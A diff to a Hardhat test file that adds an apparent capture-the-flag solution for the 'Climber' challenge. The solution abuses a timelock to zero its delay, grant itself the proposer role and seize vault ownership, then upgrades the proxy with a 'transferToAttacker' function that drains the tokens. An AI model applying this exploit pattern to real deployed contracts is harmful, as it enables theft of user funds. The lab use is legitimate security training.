@@ -1,6 +1,6 @@
 const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
-const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { setBalance, time } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, player;
@@ -16,12 +16,12 @@ describe('[Challenge] Climber', function () {
 
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the vault behind a proxy using the UUPS pattern,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         vault = await upgrades.deployProxy(
             await ethers.getContractFactory('ClimberVault', deployer),
-            [ deployer.address, proposer.address, sweeper.address ],
+            [deployer.address, proposer.address, sweeper.address],
             { kind: 'uups' }
         );
 
@@ -29,17 +29,17 @@ describe('[Challenge] Climber', function () {
         expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
         expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
         expect(await vault.owner()).to.not.eq(deployer.address);
-        
+
         // Instantiate timelock
         let timelockAddress = await vault.owner();
         timelock = await (
             await ethers.getContractFactory('ClimberTimelock', deployer)
         ).attach(timelockAddress);
-        
+
         // Ensure timelock delay is correct and cannot be changed
         expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
         await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
-        
+
         // Ensure timelock roles are correctly initialized
         expect(
             await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
@@ -58,6 +58,30 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("JS/Execution/start");
+
+        let dummySalt = ethers.constants.HashZero;
+        let PROPOSER_ROLE = ethers.utils.solidityKeccak256(["string"], ["PROPOSER_ROLE"]);
+
+        // deploy steal
+        steal = await (await ethers.getContractFactory('StealFromClimber', player)).deploy(timelock.address);
+        // set delay to 0
+        let data = timelock.interface.encodeFunctionData("updateDelay", [0]);
+        // grant proposer role to steal contract
+        let data2 = (new ethers.utils.Interface(["function grantRole(bytes32 role, address account)"])).encodeFunctionData("grantRole", [PROPOSER_ROLE, steal.address]);
+        // transfer timelock owner to player
+        let data3 = vault.interface.encodeFunctionData("transferOwnership", [player.address]);
+        // call steal.attack_callback
+        let data4 = steal.interface.encodeFunctionData("attack_callback", []);
+
+        await steal.connect(player).attack([timelock.address, timelock.address, vault.address, steal.address], [0, 0, 0, 0], [data, data2, data3, data4], dummySalt);
+
+        // now player is the owner of vault
+        // upgrade to add function that transfer all tokens to player
+        v2 = await upgrades.upgradeProxy(vault, await ethers.getContractFactory("ClimberVaultV2", player));
+        await v2.connect(player).transferToAttacker(token.address);
+
+        console.log("JS/Execution/done");
     });
 
     after(async function () {
